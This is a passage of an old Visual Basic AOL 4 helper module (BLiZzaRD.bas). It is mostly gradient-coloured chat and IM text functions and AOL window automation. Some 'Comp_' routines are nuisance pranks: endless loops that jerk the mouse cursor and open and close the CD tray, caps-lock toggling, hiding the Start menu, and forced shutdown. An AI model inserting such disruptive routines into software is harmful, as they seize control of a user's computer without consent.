        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyYellowGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Sub Comp_HideMouse()
Hid$ = ShowCursor(False)
End Sub
Sub Comp_HideStartmenu()
c% = FindWindow("Shell_TrayWnd", vbNullString)
a = ShowWindow(c%, SW_HIDE)
End Sub
Sub Comp_StartButton()
'Opens the start menu
wind% = FindWindow("Shell_TrayWnd", vbNullString)
Btn% = FindIt(wind%, "Button")
SendNow% = SenditbyNum(Btn%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SenditbyNum(Btn%, WM_LBUTTONUP, &HD, 0)
End Sub
Sub Comp_ScreenSaver()
'Turns it on
       Dim lResult As Long
       Const WM_SYSCOMMAND = &H112
       Const SC_SCREENSAVE = &HF140
       lResult = SendMessage(-1, WM_SYSCOMMAND, SC_SCREENSAVE, 0&)
End Sub
Sub Comp_ShowStartmenu()
c% = FindWindow("Shell_TrayWnd", vbNullString)
a = ShowWindow(c%, SW_SHOW)
End Sub
Sub Comp_GhostlyCd()
Do
Call Comp_OpenCd
TimeOut 1#
Call Comp_CloseCd                                                                                                                          'Sehnsucht.bas by: meeh Email:thismightbetripp@aol.com
DoEvents
Loop
End Sub
Sub Comp_ShowMouse()
Hid$ = ShowCursor(True)
End Sub
Sub Comp_CloseCd()
retvalue = mciSendString("set CDAudio door closed", vbNullString, 0, 0)
End Sub
Sub Comp_Capslock(value As Boolean)
'Ie: SetCapslock = True
'Ie: SetCapslock = False
       Call SetKeyState(vbKeyCapital, value)
End Sub
Sub ForceShutdown()
'this will force the shutdown of the computer
ForcedShutdown = ExitWindowsEx(EWX_FORCE, 0&)
End Sub
Private Sub SetKeyState(intKey As Integer, fTurnOn As Boolean)                                                                           '========================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com

       Dim abytBuffer(0 To 255) As Byte
       GetKeyboardState abytBuffer(0)
       abytBuffer(intKey) = CByte(Abs(fTurnOn))
       SetKeyboardState abytBuffer(0)
End Sub
Sub Comp_Shutdown()
StandardShutdown = ExitWindowsEx(EWX_SHUTDOWN, 0&)
End Sub
Sub Comp_OpenCd()
retvalue = mciSendString("set CDAudio door open", vbNullString, 0, 0)
End Sub
Sub Comp_Restart()
ForcedShutdown = ExitWindowsEx(EWX_REBOOT, 0&)
End Sub
Sub Comp_InsaneMouse()
Do
boob = (Rnd * 400)
boob2 = (Rnd * 400)
whatever = SetCursorPos(boob, boob2)
DoEvents
Loop
End Sub
Sub Comp_Freak()
Do
boob = (Rnd * 100)
boob2 = (Rnd * 400)
whatever = SetCursorPos(boob, boob2)
TimeOut 1#
Comp_OpenCd
Comp_Capslock True
Comp_Capslock False
Comp_Capslock True
Comp_Capslock False
Comp_Capslock True
Comp_Capslock False
Comp_Capslock True
Comp_Capslock False
boob = (Rnd * 100)
boob2 = (Rnd * 400)
whatever = SetCursorPos(boob, boob2)
Comp_CloseCd
DoEvents
Loop
End Sub

Sub AoL4_MailKeepitNew()
AOL% = FindItsTitle(AoL3_MdI(), AoL4_UserSn & "'s Online Mailbox")
If AOL% = 0 Then AOL% = FindItsTitle(AoL4_Child(), "Online Mailbox")
AOL% = FindIt(AOL%, "_AOL_Icon")
AOL% = GetWindow(AOL%, GW_HWNDNEXT)
AOL% = GetWindow(AOL%, GW_HWNDNEXT)
ClickIcon (AOL%)
End Sub
Sub AoL4_MailWrite()
AOL% = FindWindow("AOL Frame25", 0&)
Toolbar% = FindIt(AOL%, "AOL Toolbar")
ToolBarChild% = FindIt(Toolbar%, "_AOL_Toolbar")
ToolBarr% = FindIt(ToolBarChild%, "_AOL_Icon")
ToolBarr% = GetWindow(ToolBarr%, 2)
Click ToolBarr%
End Sub
Sub KillWindo(Windo)
x = SenditbyNum(Windo, WM_CLOSE, 0, 0)
End Sub
Sub KillModal()
Modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(Modal%, WM_CLOSE, 0, 0)
End Sub
Function AoL4_ImMessage()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindIt(AOL%, "MDIClient")

IM% = FindItsTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindItsTitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
IMText% = FindIt(IM%, "RICHCNTL")
IMmessage = AoL4_GetText(IMText%)
SN = AoL4_ImsSn()
snlen = Len(AoL4_ImsSn()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
AoL4_ImMessage = Left(blah, Len(blah) - 1)
End Function
Function AoL4_ImsSn()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindIt(AOL%, "MDIClient") '
IM% = FindItsTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo god
IM% = FindItsTitle(MDI%, "  Instant Message From:")
If IM% Then GoTo god
Exit Function

god:
IMCap$ = GetCaption(IM%)
theSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
AoL4_ImsSn = theSN$
End Function

Sub AoL4_UpchatOn()
AOL% = FindWindow("AOL Frame25", vbNullString)
Modal% = FindIt(AOL%, "_AOL_Modal")
Gauge% = FindIt(Modal%, "_AOL_Gauge")
If Gauge% <> 0 Then Go% = Modal%
Call EnableWindow(AOL%, 1)
Call EnableWindow(Go%, 0)
End Sub

Sub AoL4_UpchatOff()
AOL% = FindWindow("AOL Frame25", vbNullString)
Modal% = FindIt(AOL%, "_AOL_Modal")
Gauge% = FindIt(Modal%, "_AOL_Gauge")
If Gauge% <> 0 Then Go% = Modal%
Call EnableWindow(Go%, 1)
Call EnableWindow(AOL%, 0)
End Sub

Sub AoL4_KillWait()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindIt(AOL%, "AOL Toolbar")
aotool2% = FindIt(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindIt(aotool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

Call TimeOut(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindIt(AOL%, "MDIClient")
KeyWordWin% = FindItsTitle(MDI%, "Keyword")
AOedit% = FindIt(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindIt(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOedit% <> 0 And AOIcon2% <> 0

Call SendMessage(KeyWordWin%, WM_CLOSE, 0, 0)
End Sub

Public Sub AoL4_PrivateRoom(Name As String)
    AOL4_Keyword ("aol://2719:2-2-" & Name$)
End Sub

Public Sub AoL4_MemberRoomTownSquare(Name As String)
    AOL4_Keyword ("aol://2719:61-2-" & Name$)
End Sub

Public Sub AoL4_MemberRoomEntertainment(Name As String)
    AOL4_Keyword ("aol://2719:62-2-" & Name$)
End Sub

Public Sub AoL4_MemberRoomFreinds(Name As String)
    AOL4_Keyword ("aol://2719:74-2-" & Name$)
End Sub

Public Sub AoL4_MemberRoomLife(Name As String)
    AOL4_Keyword ("aol://2719:63-2-" & Name$)
End Sub

Public Sub AoL4_MemberRoomNews(Name As String)
    AOL4_Keyword ("aol://2719:64-2-" & Name$)
End Sub

Public Sub AoL4_MemberRoomPlaces(Name As String)
    AOL4_Keyword ("aol://2719:65-2-" & Name$)
End Sub

Public Sub AoL4_MemberRoomRomance(Name As String)
    AOL4_Keyword ("aol://2719:66-2-" & Name$)
End Sub

Public Sub AoL4_MemberRoomSpecial(Name As String)
    AOL4_Keyword ("aol://2719:67-2-" & Name$)
End Sub

Public Sub AoL4_FeaturedRoomTownSquare(Name As String)
    AOL4_Keyword ("aol://2719:21-2-" & Name$)
End Sub

Public Sub AoL4_FeaturedRoomEntertainment(Name As String)
    AOL4_Keyword ("aol://2719:22-2-" & Name$)
End Sub

Public Sub AoL4_FeaturedRoomFreinds(Name As String)
    AOL4_Keyword ("aol://2719:34-2-" & Name$)
End Sub

Public Sub AoL4_FeaturedRoomLife(Name As String)
    AOL4_Keyword ("aol://2719:23-2-" & Name$)
End Sub

Public Sub AoL4_FeaturedRoomNews(Name As String)
    AOL4_Keyword ("aol://2719:24-2-" & Name$)
End Sub

Public Sub AoL4_FeaturedRoomPlaces(Name As String)
    AOL4_Keyword ("aol://2719:25-2-" & Name$)
End Sub

Public Sub AoL4_FeaturedRoomRomance(Name As String)
    AOL4_Keyword ("aol://2719:26-2-" & Name$)
End Sub

Public Sub AoL4_FeaturedRoomSpecial(Name As String)
    AOL4_Keyword ("aol://2719:27-2-" & Name$)
End Sub

Function AOL4_FindRoom()
    AOL% = FindWindow("AOL Frame25", vbNullString)
    MDI% = FindIt(AOL%, "MDIClient")
    firs% = GetWindow(MDI%, 5)
    listers% = FindIt(firs%, "RICHCNTL")
    listere% = FindIt(firs%, "RICHCNTL")
    listerb% = FindIt(firs%, "_AOL_Listbox")
    Do While (listers% = 0 Or listere% = 0 Or listerb% = 0) And (L <> 100)
            DoEvents
            firs% = GetWindow(firs%, 2)
            listers% = FindIt(firs%, "RICHCNTL")
            listere% = FindIt(firs%, "RICHCNTL")
            listerb% = FindIt(firs%, "_AOL_Listbox")
            If listers% And listere% And listerb% Then Exit Do
            L = L + 1
    Loop
    If (L < 100) Then
       AOL4_FindRoom = firs%
       Exit Function
     End If
End Function
Function AoL4_FindChatRoom()
    AOL% = FindWindow("AOL Frame25", vbNullString)
    MDI% = FindIt(AOL%, "MDIClient")
    firs% = GetWindow(MDI%, 5)
    listers% = FindIt(firs%, "RICHCNTL")
    listere% = FindIt(firs%, "RICHCNTL")
    listerb% = FindIt(firs%, "_AOL_Listbox")
    Do While (listers% = 0 Or listere% = 0 Or listerb% = 0) And (L <> 100)
            DoEvents
            firs% = GetWindow(firs%, 2)
            listers% = FindIt(firs%, "RICHCNTL")
            listere% = FindIt(firs%, "RICHCNTL")
            listerb% = FindIt(firs%, "_AOL_Listbox")
            If listers% And listere% And listerb% Then Exit Do
            L = L + 1
    Loop
    If (L < 100) Then
        AoL4_FindChatRoom = firs%
        Exit Function
    End If
    AoL4_FindChatRoom = 0
End Function
Function AoL4_GetChatText()
Room% = AOL4_FindRoom
MoreStuff% = FindIt(Room%, "RICHCNTL")
AORich% = FindIt(Room%, "RICHCNTL")
ChatText$ = AoL4_GetText(AORich%)
AoL4_GetChatText = ChatText$
End Function
Function AoL4_GreenBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreenBlackGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreenBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreenBlueGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreenPurple(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreenPurpleGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreenRed(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreenRedGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreenYellow(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreenYellowGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyBlackGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyBlueGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyGreenGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyPurple(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyPurpleGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyRed(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyRedGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyYellow(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_GreyYellowGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_BoldGreenBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreenBlackGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreenBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreenBlueGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function ÂoL4_BoldGreenPurple(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreenPurpleGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreenRed(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreenRedGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreenYellow(Txt)                                                                           '==============================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreenYellowGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyBlackGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyBlueGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyGreenGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("<b> " + Msg + "")
End Function
Function AoL4_BoldGreyPurple(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyPurpleGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyRed(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyRedGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyYellow(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_BoldGreyYellowGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function

Function AoL4_LastChatLineToList(Lst As ListBox)
'Put this in a timer

Lst.ListIndex = Lst.ListCount - 1
If Lst.text Like LCase(AoL4_LastChatLine) Then
   Exit Function
Else
   Lst.AddItem AoL4_LastChatLine
End If
End Function
Function AoL4_ImBoldBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
